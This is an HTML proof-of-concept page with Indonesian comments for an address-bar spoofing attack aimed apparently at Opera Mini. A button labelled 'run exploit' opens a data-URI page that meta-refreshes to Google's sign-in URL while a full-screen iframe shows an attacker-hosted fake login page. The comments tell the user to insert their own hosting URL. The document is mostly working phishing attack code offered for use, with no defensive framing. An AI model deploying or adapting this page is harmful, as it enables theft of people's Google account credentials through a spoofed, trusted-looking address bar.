<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Refresh Fuzzer</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        button { background: #1976d2; color: white; padding: 20px 40px; font-size: 20px; border: none; border-radius: 8px; font-weight: bold; }
    </style>
</head>
<body>

    <h2>Meta Refresh Address Bar Spoof</h2>
    <button onclick="runExploit()">JALANKAN EXPLOIT</button>

    <script>
        function runExploit() {
            // GANTI URL INI DENGAN URL HOSTING KAMU (fake.html)
            // Contoh: https://username.github.io/poc/fake.html
            const attackerPage = "https://NAMA_HOSTING_KAMU/fake.html"; 
            
            const targetGoogle = "https://accounts.google.com/v3/signin/identifier";

            // Kita buat halaman HTML jembatan yang isinya Meta Refresh
            // Halaman ini yang akan dieksekusi oleh Opera Mini
            const bridgeHtml = `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Loading...</title>
                    <!-- Trik: Memaksa Address Bar berubah ke Google dalam 10ms -->
                    <meta http-equiv="refresh" content="0;url=${targetGoogle}">
                </head>
                <body style="margin:0; padding:0; overflow:hidden;">
                    
                    <!-- Kita panggil halaman login palsu menggunakan iframe fullscreen -->
                    <!-- Ini bertujuan agar saat browser sibuk redirect ke Google, UI kita tetap muncul di atasnya -->
                    <iframe src="${attackerPage}" style="position:absolute; top:0; left:0; width:100vw; height:100vh; border:none; z-index:99999;"></iframe>
                    
                </body>
                </html>
            `;

            // Encode jembatan HTML ke Data URI
            const dataUri = "data:text/html;charset=utf-8," + encodeURIComponent(bridgeHtml);

            // Eksekusi
            const w = window.open(dataUri, "_blank");
            if (!w) alert("Popup diblokir!");
        }
    </script>
</body>
</html>
